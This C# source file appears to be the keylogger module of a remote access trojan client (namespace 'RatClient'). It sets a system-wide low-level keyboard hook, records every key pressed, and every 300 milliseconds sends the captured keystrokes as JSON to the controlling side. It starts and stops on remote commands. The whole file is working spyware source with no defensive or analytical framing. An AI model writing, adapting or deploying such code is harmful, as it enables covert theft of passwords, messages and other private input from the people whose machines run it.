﻿using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Timers;

namespace RatClient.Features
{
    public class KeyLogger
    {
        #region Variables
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static StringBuilder keyStrokes = new StringBuilder();
        private static System.Timers.Timer keySendTimer;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private Action<object> SendJson;
        #endregion

        #region Methods
        public KeyLogger(Action<dynamic> SendJson)
        {
            this.SendJson = SendJson;

            keySendTimer = new System.Timers.Timer(300);
            keySendTimer.Elapsed += SendKeystrokes;
            keySendTimer.Start();

            Program.MessageReceived += HandleMessage;
        }

        private void HandleMessage(dynamic message)
        {
            switch (message["type"])
            {
                case "start_keylogger":
                    Start();
                    break;
                case "stop_keylogger":
                    Stop();
                    break;
            }
        }

        public void SendKeystrokes(object sender, ElapsedEventArgs e)
        {
            string keystrokes = GetKeystrokes();
            if (!string.IsNullOrEmpty(keystrokes))
            {
                SendJson(new { type = "keystroke", key = keystrokes });
                keystrokes = "";
            }
        }

        public static void Start()
        {
            _hookID = SetHook(_proc);
        }

        public static void Stop()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
        }

        public static string GetKeystrokes()
        {
            string keystrokes = keyStrokes.ToString();
            return keystrokes;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                keyStrokes.Append((Keys)vkCode + "\n");
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        #endregion
    }
}